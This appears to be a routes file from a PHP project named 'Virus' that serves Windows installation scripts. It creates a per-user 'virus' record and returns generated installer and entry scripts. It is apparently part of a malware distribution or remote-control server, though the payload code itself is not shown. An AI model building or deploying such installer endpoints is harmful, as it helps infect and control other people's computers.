<?php

// routes for installation entry point
use Kelvinho\Virus\Attack\BaseScriptWin;
use Kelvinho\Virus\Header;

$router->get("new/win/*", function () use ($requestData, $virusFactory) {
    $user_handle = $requestData->getExplodedPath()[2];
    $virus = $virusFactory->new($user_handle);
    echo BaseScriptWin::initStandalone($virus->getVirusId(), $user_handle);
    Header::ok();
});
$router->get("new/win/*/entry", function () use ($requestData) {
    $user_handle = $requestData->getExplodedPath()[2];
    echo BaseScriptWin::simpleMain($user_handle);
    Header::ok();
});
$router->get("new/win/*/license", function () {
    echo BaseScriptWin::license();
});
